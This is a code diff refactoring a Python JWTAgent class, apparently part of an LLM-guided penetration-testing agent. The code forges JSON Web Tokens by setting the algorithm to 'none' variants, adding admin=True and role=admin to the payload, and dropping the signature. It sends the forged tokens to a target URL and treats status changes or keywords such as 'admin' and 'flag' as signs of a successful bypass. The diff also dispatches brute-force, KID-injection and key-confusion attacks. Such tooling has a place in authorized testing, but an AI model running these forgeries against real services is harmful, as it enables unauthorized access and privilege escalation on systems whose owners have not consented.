@@ -254,153 +254,200 @@ class JWTAgent(BaseAgent):
         Sends a request with the forged token to verify validation bypass.
         Improved to check response content for success indicators.
         """
-        import aiohttp
-        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
-        
         try:
-            # 1. Setup Request Helper
-            async def make_req(target_url, tok, loc):
-                headers = {}
-                final_url = target_url
-                
-                if loc == "header":
-                    headers["Authorization"] = f"Bearer {tok}"
-                elif loc == "cookie":
-                    headers["Cookie"] = f"session={tok}"
-                elif "param" in loc or loc == "manual":
-                    # Inject into URL parameter
-                    p = urlparse(target_url)
-                    qs = parse_qs(p.query)
-                    
-                    found_param = False
-                    for k, v in qs.items():
-                        if any(self._is_jwt(val) for val in v):
-                            qs[k] = [tok]
-                            found_param = True
-                    
-                    if not found_param and loc == "manual":
-                        # If we don't know where it goes, try 'token' and 'jwt'
-                        qs["token"] = [tok]
-                    
-                    new_query = urlencode(qs, doseq=True)
-                    final_url = urlunparse((p.scheme, p.netloc, p.path, p.params, new_query, p.fragment))
-                    
-                    # Fallback for manual: also try as a header if URL injection doesn't look right
-                    if loc == "manual" and not found_param:
-                        headers["Authorization"] = f"Bearer {tok}"
+            # Execute verification steps
+            base_status, base_text, _ = await self._token_execute_baseline(url, location)
+            status, text, final_attack_url = await self._token_execute_test(url, forged_token, location)
 
-                async with aiohttp.ClientSession() as session:
-                    async with session.get(final_url, headers=headers, timeout=5) as r:
-                        body = await r.text()
-                        return r.status, body, final_url
+            # Log results
+            self._token_log_verification(final_attack_url, base_status, status, base_text, text)
 
-            # 2. Baseline Status (Invalid)
-            base_status, base_text, _ = await make_req(url, "invalid.token.123", location)
-            
-            # 3. Attack Status
-            status, text, final_atack_url = await make_req(url, forged_token, location)
-            
-            self.think(f"Requesting: {final_atack_url}")
-            self.think(f"Verification: Base Status={base_status} vs Forged Status={status}")
-            self.think(f"Base Body: '{base_text[:50]}...' | Forged Body: '{text[:50]}...'")
-
-            # 4. Decision Logic (Advanced)
-            # - Success keywords (Dojo specific or generic)
-            success_keywords = ["welcome", "admin", "logged in", "flag", "success", "bt7331", "role: admin", "MASTER_PASS", "ROOT_KEY"]
-            fail_keywords = ["invalid", "unauthorized", "expired", "forbidden", "anonymous", "invalid token", "blocked"]
-            
-            text_lower = text.lower()
-            base_text_lower = base_text.lower()
-            
-            # If status changed from error to success
-            if base_status in [401, 403] and status == 200:
-                self.think("SUCCESS: Status code change detected (Error -> 200)")
-                return True
-            
-            # If status stays 200 but content indicates success
-            if status == 200:
-                # Check if we see success markers that weren't in base
-                for sk in success_keywords:
-                    if sk in text_lower and sk not in base_text_lower:
-                        self.think(f"SUCCESS: Content-based indicator found '{sk}'")
-                        return True
-                
-                # Check if fail markers disappeared
-                for fk in fail_keywords:
-                    if fk in base_text_lower and fk not in text_lower:
-                        self.think(f"SUCCESS: Content-based indicator - failure marker '{fk}' disappeared")
-                        return True
-
-            return False
+            # Analyze response
+            return self._token_analyze_response(base_status, status, base_text, text)
         except Exception as e:
             logger.debug(f"Token verification failed: {e}")
             return False
 
+    async def _token_execute_baseline(self, url: str, location: str) -> Tuple[int, str, str]:
+        """Execute baseline request with invalid token."""
+        return await self._token_make_request(url, "invalid.token.123", location)
+
+    async def _token_execute_test(self, url: str, forged_token: str, location: str) -> Tuple[int, str, str]:
+        """Execute test request with forged token."""
+        return await self._token_make_request(url, forged_token, location)
+
+    async def _token_make_request(self, target_url: str, token: str, loc: str) -> Tuple[int, str, str]:
+        """Make HTTP request with token in appropriate location."""
+        import aiohttp
+        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+
+        headers = {}
+        final_url = target_url
+
+        if loc == "header":
+            headers["Authorization"] = f"Bearer {token}"
+        elif loc == "cookie":
+            headers["Cookie"] = f"session={token}"
+        elif "param" in loc or loc == "manual":
+            final_url, headers = self._token_inject_param(target_url, token, loc, headers)
+
+        async with aiohttp.ClientSession() as session:
+            async with session.get(final_url, headers=headers, timeout=5) as r:
+                body = await r.text()
+                return r.status, body, final_url
+
+    def _token_inject_param(self, target_url: str, token: str, loc: str, headers: Dict) -> Tuple[str, Dict]:
+        """Inject token into URL parameter."""
+        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+
+        p = urlparse(target_url)
+        qs = parse_qs(p.query)
+
+        found_param = False
+        for k, v in qs.items():
+            if any(self._is_jwt(val) for val in v):
+                qs[k] = [token]
+                found_param = True
+
+        if not found_param and loc == "manual":
+            qs["token"] = [token]
+
+        new_query = urlencode(qs, doseq=True)
+        final_url = urlunparse((p.scheme, p.netloc, p.path, p.params, new_query, p.fragment))
+
+        # Fallback for manual: also try as a header
+        if loc == "manual" and not found_param:
+            headers["Authorization"] = f"Bearer {token}"
+
+        return final_url, headers
+
+    def _token_log_verification(self, final_url: str, base_status: int, status: int, base_text: str, text: str):
+        """Log verification attempt details."""
+        self.think(f"Requesting: {final_url}")
+        self.think(f"Verification: Base Status={base_status} vs Forged Status={status}")
+        self.think(f"Base Body: '{base_text[:50]}...' | Forged Body: '{text[:50]}...'")
+
+    def _token_analyze_response(self, base_status: int, status: int, base_text: str, text: str) -> bool:
+        """Analyze response to determine if token validation was bypassed."""
+        success_keywords = ["welcome", "admin", "logged in", "flag", "success", "bt7331", "role: admin", "MASTER_PASS", "ROOT_KEY"]
+        fail_keywords = ["invalid", "unauthorized", "expired", "forbidden", "anonymous", "invalid token", "blocked"]
+
+        text_lower = text.lower()
+        base_text_lower = base_text.lower()
+
+        # Check status code change
+        if base_status in [401, 403] and status == 200:
+            self.think("SUCCESS: Status code change detected (Error -> 200)")
+            return True
+
+        # Check content-based indicators
+        if status == 200:
+            # Success markers appeared
+            for sk in success_keywords:
+                if sk in text_lower and sk not in base_text_lower:
+                    self.think(f"SUCCESS: Content-based indicator found '{sk}'")
+                    return True
+
+            # Fail markers disappeared
+            for fk in fail_keywords:
+                if fk in base_text_lower and fk not in text_lower:
+                    self.think(f"SUCCESS: Content-based indicator - failure marker '{fk}' disappeared")
+                    return True
+
+        return False
+
     async def _check_none_algorithm(self, token: str, url: str, location: str) -> bool:
         """Attempt 'none' algorithm attack."""
         parts = token.split('.')
-        if len(parts) != 3: return False
-        
-        try:
-            header = json.loads(self._base64_decode(parts[0]))
-        except (json.JSONDecodeError, ValueError, TypeError):
+        if len(parts) != 3:
             return False
-        
-        # Test variations of 'none'
-        variations = ['none', 'None', 'NONE', 'nOnE']
-        
-        for alg in variations:
-            new_header = header.copy()
-            new_header['alg'] = alg
-            
-            h_json = json.dumps(new_header, separators=(',', ':')).encode()
-            h_b64 = base64.urlsafe_b64encode(h_json).decode().strip('=')
-            
-            # ATTACK: We must elevate privileges
-            try:
-                payload = json.loads(self._base64_decode(parts[1]))
-                payload['admin'] = True
-                payload['role'] = 'admin'
-                p_json = json.dumps(payload, separators=(',', ':')).encode()
-                p_b64 = base64.urlsafe_b64encode(p_json).decode().strip('=')
-            except Exception as e:
-                p_b64 = parts[1] # Fallback to original if decode fails
 
-            # Valid 'none' tokens have empty signature, but sometimes need trailing dot
-            # Case 1: Header.Payload.
-            forged_token = f"{h_b64}.{p_b64}."
-            if await self._verify_token_works(forged_token, url, location):
-                self.think(f"SUCCESS: 'none' algorithm bypass confirmed with alg={alg}")
-                self.findings.append({
-                    "type": "JWT None Algorithm",
-                    "url": url,
-                    "parameter": "alg",
-                    "payload": f"alg:{alg}",
-                    "severity": "CRITICAL",
-                    "validated": True,
-                    "status": "VALIDATED_CONFIRMED",
-                    "description": f"JWT None Algorithm bypass vulnerability. The server accepts tokens with algorithm set to '{alg}', allowing signature verification to be bypassed. An attacker can forge arbitrary tokens without knowing the secret key.",
-                    "reproduction": f"# Forge JWT with 'none' algorithm:\n# 1. Decode header, change 'alg' to '{alg}'\n# 2. Remove signature (keep trailing dot)\n# Forged token: {forged_token[:50]}..."
-                })
+        header = self._none_alg_decode_header(parts)
+        if not header:
+            return False
+
+        # Test all algorithm variations
+        variations = ['none', 'None', 'NONE', 'nOnE']
+        for alg in variations:
+            if await self._none_alg_test_variant(alg, header, parts, url, location):
                 return True
 
-            # Case 2: Header.Payload (no trailing dot - rare but exists)
-            forged_token_nodot = f"{h_b64}.{p_b64}"
-            if await self._verify_token_works(forged_token_nodot, url, location):
-                 self.think(f"SUCCESS: 'none' algorithm bypass (no dot) confirmed with alg={alg}")
-                 self.findings.append({
-                    "type": "JWT None Algorithm",
-                    "url": url,
-                    "parameter": "alg",
-                    "payload": f"alg:{alg} (no dot)",
-                    "severity": "CRITICAL",
-                    "validated": True,
-                    "status": "VALIDATED_CONFIRMED",
-                    "description": f"JWT None Algorithm bypass vulnerability (no trailing dot variant). The server accepts tokens with algorithm '{alg}' without a trailing dot, allowing complete signature bypass.",
-                    "reproduction": f"# Forge JWT with 'none' algorithm (no trailing dot):\n# Forged token: {forged_token_nodot[:50]}..."
-                })
-                 return True
+        return False
 
+    def _none_alg_decode_header(self, parts: List[str]) -> Optional[Dict]:
+        """Decode JWT header for none algorithm attack."""
+        try:
+            return json.loads(self._base64_decode(parts[0]))
+        except (json.JSONDecodeError, ValueError, TypeError):
+            return None
+
+    async def _none_alg_test_variant(self, alg: str, header: Dict, parts: List[str], url: str, location: str) -> bool:
+        """Test single 'none' algorithm variant."""
+        # Build modified header
+        new_header = header.copy()
+        new_header['alg'] = alg
+
+        h_json = json.dumps(new_header, separators=(',', ':')).encode()
+        h_b64 = base64.urlsafe_b64encode(h_json).decode().strip('=')
+
+        # Build privileged payload
+        p_b64 = self._none_alg_build_payload(parts)
+
+        # Test both token formats
+        if await self._none_alg_test_with_dot(h_b64, p_b64, alg, url, location):
+            return True
+        if await self._none_alg_test_without_dot(h_b64, p_b64, alg, url, location):
+            return True
+
+        return False
+
+    def _none_alg_build_payload(self, parts: List[str]) -> str:
+        """Build elevated privilege payload for none algorithm attack."""
+        try:
+            payload = json.loads(self._base64_decode(parts[1]))
+            payload['admin'] = True
+            payload['role'] = 'admin'
+            p_json = json.dumps(payload, separators=(',', ':')).encode()
+            return base64.urlsafe_b64encode(p_json).decode().strip('=')
+        except Exception:
+            return parts[1]  # Fallback to original
+
+    async def _none_alg_test_with_dot(self, h_b64: str, p_b64: str, alg: str, url: str, location: str) -> bool:
+        """Test none algorithm with trailing dot format."""
+        forged_token = f"{h_b64}.{p_b64}."
+        if await self._verify_token_works(forged_token, url, location):
+            self.think(f"SUCCESS: 'none' algorithm bypass confirmed with alg={alg}")
+            self.findings.append({
+                "type": "JWT None Algorithm",
+                "url": url,
+                "parameter": "alg",
+                "payload": f"alg:{alg}",
+                "severity": "CRITICAL",
+                "validated": True,
+                "status": "VALIDATED_CONFIRMED",
+                "description": f"JWT None Algorithm bypass vulnerability. The server accepts tokens with algorithm set to '{alg}', allowing signature verification to be bypassed. An attacker can forge arbitrary tokens without knowing the secret key.",
+                "reproduction": f"# Forge JWT with 'none' algorithm:\n# 1. Decode header, change 'alg' to '{alg}'\n# 2. Remove signature (keep trailing dot)\n# Forged token: {forged_token[:50]}..."
+            })
+            return True
+        return False
+
+    async def _none_alg_test_without_dot(self, h_b64: str, p_b64: str, alg: str, url: str, location: str) -> bool:
+        """Test none algorithm without trailing dot format."""
+        forged_token_nodot = f"{h_b64}.{p_b64}"
+        if await self._verify_token_works(forged_token_nodot, url, location):
+            self.think(f"SUCCESS: 'none' algorithm bypass (no dot) confirmed with alg={alg}")
+            self.findings.append({
+                "type": "JWT None Algorithm",
+                "url": url,
+                "parameter": "alg",
+                "payload": f"alg:{alg} (no dot)",
+                "severity": "CRITICAL",
+                "validated": True,
+                "status": "VALIDATED_CONFIRMED",
+                "description": f"JWT None Algorithm bypass vulnerability (no trailing dot variant). The server accepts tokens with algorithm '{alg}' without a trailing dot, allowing complete signature bypass.",
+                "reproduction": f"# Forge JWT with 'none' algorithm (no trailing dot):\n# Forged token: {forged_token_nodot[:50]}..."
+            })
+            return True
         return False
 
     async def _attack_brute_force(self, token: str, url: str, location: str):
@@ -626,32 +673,54 @@ class JWTAgent(BaseAgent):
                 return
 
             self.think(f"Token Analysis: Alg={decoded['header'].get('alg')}, Claims={list(decoded['payload'].keys())}")
-            
-            # 2. Consult LLM for strategy
-            strategy = await self._get_llm_strategy(decoded, url, location)
-            if not strategy:
-                # Fallback to standard attacks if LLM fails
-                strategy = {"plan": ["Check None Algorithm", "Brute Force Secret", "Check KID Injection"]}
+
+            # 2. Get attack strategy
+            strategy = await self._get_attack_strategy(decoded, url, location)
 
             # 3. Execute Attack Plan
-            plan_raw = strategy.get("plan")
-            if plan_raw:
-                steps = [s.strip() for s in plan_raw.split('\n') if s.strip()] if isinstance(plan_raw, str) else plan_raw
-                for step in steps:
-                    self.think(f"Executing step: {step}")
-                    step_lower = step.lower()
-                    
-                    if "none" in step_lower:
-                        await self._check_none_algorithm(token, url, location)
-                    elif "brute" in step_lower or "secret" in step_lower:
-                        await self._attack_brute_force(token, url, location)
-                    elif "kid" in step_lower or "injection" in step_lower:
-                        await self._attack_kid_injection(token, url, location)
-                    elif "confusion" in step_lower or "rsa" in step_lower or "hs256" in step_lower:
-                        await self._attack_key_confusion(token, url, location)
-            
+            await self._execute_attack_plan(strategy, token, url, location)
+
         except Exception as e:
             logger.error(f"[{self.name}] Token analysis failed: {e}", exc_info=True)
+
+    async def _get_attack_strategy(self, decoded: Dict, url: str, location: str) -> Dict:
+        """Get attack strategy from LLM or use fallback."""
+        strategy = await self._get_llm_strategy(decoded, url, location)
+        if strategy:
+            return strategy
+
+        # Fallback to standard attacks if LLM fails
+        return {"plan": ["Check None Algorithm", "Brute Force Secret", "Check KID Injection"]}
+
+    async def _execute_attack_plan(self, strategy: Dict, token: str, url: str, location: str):
+        """Execute attack plan steps."""
+        plan_raw = strategy.get("plan")
+        if not plan_raw:
+            return
+
+        steps = self._parse_plan_steps(plan_raw)
+        for step in steps:
+            self.think(f"Executing step: {step}")
+            await self._execute_attack_step(step, token, url, location)
+
+    def _parse_plan_steps(self, plan_raw) -> List[str]:
+        """Parse plan into list of steps."""
+        if isinstance(plan_raw, str):
+            return [s.strip() for s in plan_raw.split('\n') if s.strip()]
+        return plan_raw
+
+    async def _execute_attack_step(self, step: str, token: str, url: str, location: str):
+        """Execute a single attack step based on keyword matching."""
+        step_lower = step.lower()
+
+        if "none" in step_lower:
+            await self._check_none_algorithm(token, url, location)
+        elif "brute" in step_lower or "secret" in step_lower:
+            await self._attack_brute_force(token, url, location)
+        elif "kid" in step_lower or "injection" in step_lower:
+            await self._attack_kid_injection(token, url, location)
+        elif "confusion" in step_lower or "rsa" in step_lower or "hs256" in step_lower:
+            await self._attack_key_confusion(token, url, location)
 
 async def run_jwt_analysis(token: str, url: str) -> Dict:
     """Convenience function for standalone analysis."""
